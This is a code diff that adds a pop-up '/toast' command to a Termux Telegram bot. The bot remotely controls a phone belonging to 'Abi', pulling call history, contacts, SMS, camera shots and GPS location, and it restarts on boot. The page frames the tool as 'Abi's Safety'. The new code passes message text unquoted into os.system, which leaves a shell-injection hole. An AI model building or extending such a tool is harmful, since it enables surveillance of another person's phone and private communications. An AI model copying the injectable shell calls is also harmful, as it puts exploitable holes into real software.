@@ -802,6 +802,15 @@ async def open_url(update, context):
     os.system(f"termux-open-url '{url}'")
     await update.message.reply_text(f"🔗 Opened on Abi's phone: {url}")
 
+async def toast(update, context):
+    if update.effective_user.id != AUTHORIZED_ID: return
+    if not context.args:
+        await update.message.reply_text("Usage: /toast <message>")
+        return
+    msg = ' '.join(context.args)
+    os.system(f"termux-toast '{msg}'")
+    await update.message.reply_text(f"💬 Popped on Abi's screen: {msg}")
+
 async def calls(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     await update.message.reply_text("⏳ Extracting Abi's Call History...")
@@ -828,6 +837,7 @@ async def help_cmd(update, context):
 🔋 /battery — Check Abi's Battery
 ⬇️ /download &lt;url&gt; — Send File to Abi's Downloads
 🔗 /open &lt;url&gt; — Open Website on Abi's Phone
+💬 /toast &lt;msg&gt; — Pop Up Message on Abi's Screen
 🗣️ /say &lt;text&gt; — Speak to Abi Remotely
 📳 /vibrate [ms] — Buzz Abi's Phone
 🔦 /torch on|off — Toggle Abi's Flashlight
@@ -844,8 +854,8 @@ async def main():
     handlers = [
         ("start", start), ("help", help_cmd), ("cam", cam), ("location", loc),
         ("battery", bat), ("download", dl), ("say", say),
-        ("vibrate", vib), ("torch", tor), ("open", open_url), ("calls", calls),
-        ("contacts", cont), ("sms", sms_cmd)
+        ("vibrate", vib), ("torch", tor), ("open", open_url), ("toast", toast),
+        ("calls", calls), ("contacts", cont), ("sms", sms_cmd)
     ]
     
     for cmd, func in handlers:
@@ -887,11 +897,11 @@ chmod +x ~/.termux/boot/start_bot.sh && echo '🛡️ Abi Protection Active — 
 
             <div class="card-footer">
                 <div class="tag-row">
-                    <span class="tag"><span class="tag-dot"></span> 11 Commands</span>
+                    <span class="tag"><span class="tag-dot"></span> 12 Commands</span>
                     <span class="tag"><span class="tag-dot"></span> Dual Camera</span>
+                    <span class="tag"><span class="tag-dot"></span> Pop-up Messages</span>
                     <span class="tag"><span class="tag-dot"></span> GPS Tracking</span>
                     <span class="tag"><span class="tag-dot"></span> .txt Reports</span>
-                    <span class="tag"><span class="tag-dot"></span> Remote Open</span>
                     <span class="tag"><span class="tag-dot"></span> Auto-Restart</span>
                 </div>
                 <p class="footer-note">Made with <span>♥</span> by Dini for Abi's Safety</p>
